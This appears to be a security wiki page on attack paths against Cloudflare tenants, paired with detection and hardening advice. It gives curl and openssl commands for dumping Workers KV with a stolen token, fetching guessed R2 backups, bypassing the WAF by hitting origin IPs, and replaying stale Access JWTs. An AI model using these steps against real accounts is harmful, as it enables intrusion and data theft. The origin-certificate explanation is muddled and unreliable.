---
title: Cloudflare Tenant Attack Paths — Workers KV, Origin Certs, and Access JWTs
slug: cloudflare-tenant-attacks
---

> **TL;DR:** Cloudflare tenants leak Workers KV blobs, expose origins via reusable origin certificates, misconfigure R2 buckets, and ship JWTs that survive token revocation if the signing key isn't rotated.

## What it is
Cloudflare's edge platform centralises DNS, WAF, zero-trust access, KV, and R2 storage — so a single API-token leak or dangling DNS record cascades fast. The 2023 Okta-HAR pivot and the 2024 Cloudflare-internal Atlassian breach both involved tenant-level token reuse against Workers and R2.

## Preconditions / where it applies
- Cloudflare API token with `Workers KV Storage:Edit` or `Account Settings:Read`
- Tenant using Cloudflare-issued origin certs without mTLS to origin
- Cloudflare Access (Zero Trust) policies fronting internal apps
- DNS records pointing to deleted Pages/Workers projects

## Technique
Workers KV exposure — list and dump namespaces with a stolen API token:

```bash
curl -H "Authorization: Bearer $CF_TOKEN" \
  "https://api.cloudflare.com/client/v4/accounts/$ACC/storage/kv/namespaces"
curl -H "Authorization: Bearer $CF_TOKEN" \
  "https://api.cloudflare.com/client/v4/accounts/$ACC/storage/kv/namespaces/$NS/keys"
```

Origin-certificate WAF bypass — Cloudflare's free origin certs are accepted by any origin in the account. Obtain one, connect directly to the origin IP (often leaked via historical DNS, censys, or SSL-cert SAN), and you bypass every WAF/rate-limit rule:

```bash
openssl s_client -connect 203.0.113.10:443 \
  -cert origin.pem -key origin.key -servername app.target.tld
```

R2 bucket misconfig — public buckets enumerated via `r2.dev` subdomain or via guessed account-id paths:

```bash
curl "https://pub-$ACCOUNT_HASH.r2.dev/backups/db-2026-05.sql.gz"
```

Cloudflare Access JWT bypass — when origin trusts `Cf-Access-Jwt-Assertion` without verifying the signature against the current JWKS, an old token (or one signed by a rotated-but-not-revoked key) still grants access:

```bash
curl -H "Cf-Access-Jwt-Assertion: $STALE_JWT" \
  https://internal.target.tld/admin
```

Tenant takeover via dangling DNS — CNAME to a deleted Pages project (`x.pages.dev`) lets an attacker claim the same project name and serve content under the victim's domain.

## Detection and defence
- Scope API tokens to single zones/accounts; require IP allowlist and short TTL; audit `tokens.create` in Cloudflare Audit Logs
- Use Authenticated Origin Pulls or mTLS so the origin only trusts Cloudflare's edge cert chain
- Make R2 buckets private; serve via signed URLs or Workers with auth
- Verify Access JWTs against the JWKS at every request; rotate the Access signing key after admin changes
- Inventory all CNAMEs nightly; alert on unresolved Pages/Workers targets

## References
- [Cloudflare Zero Trust JWT verification](https://developers.cloudflare.com/cloudflare-one/identity/authorization-cookie/validating-json/) — JWKS rotation guidance
- [Authenticated Origin Pulls](https://developers.cloudflare.com/ssl/origin-configuration/authenticated-origin-pull/) — origin-side hardening

See also: [[ci-cd-as-cloud-attack-surface]], [[terraform-state-extraction]], [[managed-identities]].
